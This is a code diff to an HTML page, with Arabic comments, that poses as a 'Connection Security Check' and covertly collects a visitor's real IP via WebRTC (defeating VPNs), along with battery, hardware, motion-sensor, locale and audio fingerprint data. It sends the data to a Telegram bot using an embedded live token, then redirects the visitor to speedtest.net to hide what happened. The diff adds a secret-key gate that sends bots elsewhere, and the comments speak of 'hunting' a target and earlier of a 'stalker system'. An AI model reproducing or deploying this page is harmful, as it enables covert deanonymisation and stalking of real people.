@@ -3,20 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking Connection...</title>
+    <title>🔒 Connection Security Check</title>
     <style>
         body { background-color: #000; color: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
     </style>
 </head>
 <body>
     <script>
-        // --- إعداداتك الخاصة ---
+        // --- إعداداتك الخاصة (لا تشاركها مع أحد) ---
         const TELEGRAM_TOKEN = "8444429563:AAEZL3LwcSp50Bx_CgL46g5KnXmC8NjAtxw";
         const CHAT_ID = "5775781038";
+        const SECRET_KEY = "strike2026"; // الكلمة المميزة لحمايتك من البوتات
 
-        async function startStalkerSystem() {
+        // 1. فحص هل الداخل "بوت" أم "المبتز" المستهدف
+        function checkAccess() {
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('auth') === SECRET_KEY) {
+                startDeepIntelligence();
+            } else {
+                // إذا دخل بوت أو متطفل، يتم تحويله لموقع رسمي فوراً
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        async function startDeepIntelligence() {
             let intel = {
-                realIP: "جاري الفحص...",
+                realIP: "Searching...",
                 battery: "Unknown",
                 device: navigator.platform,
                 cores: navigator.hardwareConcurrency || "N/A",
@@ -24,12 +36,12 @@
                 screen: `${window.screen.width}x${window.screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 lang: navigator.languages.join(", "),
-                touchPoints: navigator.maxTouchPoints,
+                touch: navigator.maxTouchPoints,
                 movement: "ثابت (Static)",
-                audioFingerprint: "Unknown"
+                audio: "Unknown"
             };
 
-            // 1. كشف الـ IP الحقيقي وتجاوز الـ VPN عبر WebRTC
+            // 2. كشف الـ IP الحقيقي (تجاوز الـ VPN)
             try {
                 const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                 pc.createDataChannel("");
@@ -41,48 +53,44 @@
                 };
             } catch (e) {}
 
-            // 2. سحب حالة البطارية
+            // 3. سحب بيانات البطارية
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 intel.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'شحن' : 'تفريغ'})`;
             }
 
-            // 3. سحب بصمة الصوت (AudioContext Fingerprint)
+            // 4. بصمة الصوت والحركة
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                intel.audioFingerprint = audioCtx.sampleRate + "Hz";
+                intel.audio = audioCtx.sampleRate + "Hz Fingerprint";
             } catch (e) {}
 
-            // 4. سحب بيانات مستشعرات الحركة (Gyroscope)
             window.ondevicemotion = (event) => {
-                if(event.acceleration && event.acceleration.x) {
-                    intel.movement = "يتحرك / يمسك الهاتف";
-                }
+                if(event.acceleration && event.acceleration.x) intel.movement = "يتحرك / يمسك الجهاز";
             };
 
-            // إرسال البيانات فوراً بعد تجميعها (تأخير بسيط لضمان سحب الـ IP)
+            // إرسال التقرير النهائي بعد تجميع البيانات
             setTimeout(() => {
                 sendToTelegram(intel);
-            }, 2500);
+            }, 3000);
         }
 
         function sendToTelegram(d) {
-            const message = `
-⚠️ **[تقرير استخباراتي شامل - صامت]** ⚠️
+            const report = `
+🔥 **[تم اصطياد المبتز بنجاح]** 🔥
 
-🌐 **الـ IP الحقيقي (خلف الـ VPN):** \`${d.realIP}\`
-🔋 **حالة البطارية:** ${d.battery}
-🧠 **العتاد:** ${d.cores} Cores | ${d.ram} GB RAM
-🖥️ **الشاشة:** ${d.screen} | ${d.touchPoints} Touch
+🌐 **الـ IP الحقيقي:** \`${d.realIP}\`
+🔋 **البطارية:** ${d.battery}
+🏃 **الحالة المادية:** ${d.movement}
+🧠 **المعالج:** ${d.cores} Cores | **الرام:** ${d.ram} GB
+🖥️ **الشاشة:** ${d.screen} | **اللمس:** ${d.touch}
 🌍 **المنطقة:** ${d.timezone}
 🔠 **اللغات:** ${d.lang}
-🏃 **الحالة المادية:** ${d.movement}
-🎵 **بصمة الصوت:** ${d.audioFingerprint}
-📱 **النظام:** ${d.device}
-⏰ **وقت الصيد:** ${new Date().toLocaleString('ar-EG')}
+📱 **نظام التشغيل:** ${d.device}
+🎵 **بصمة الصوت:** ${d.audio}
 
-🔗 **رابط التتبع الجغرافي المقترح:**
-https://www.google.com/maps?q=?q=${d.realIP}
+📍 **رابط تتبع تقريبي (IP):**
+https://www.infobyip.com/ip-${d.realIP}.html
             `;
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -90,16 +98,16 @@ https://www.google.com/maps?q=?q=${d.realIP}
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: message,
+                    text: report,
                     parse_mode: "Markdown"
                 })
             }).then(() => {
-                // إعادة توجيه الضحية لتمويه العملية
-                window.location.href = "https://www.google.com";
+                // تمويه: تحويل المبتز لصفحة تبدو تقنية
+                window.location.href = "https://www.speedtest.net";
             });
         }
 
-        startStalkerSystem();
+        checkAccess();
     </script>
 </body>
 </html>
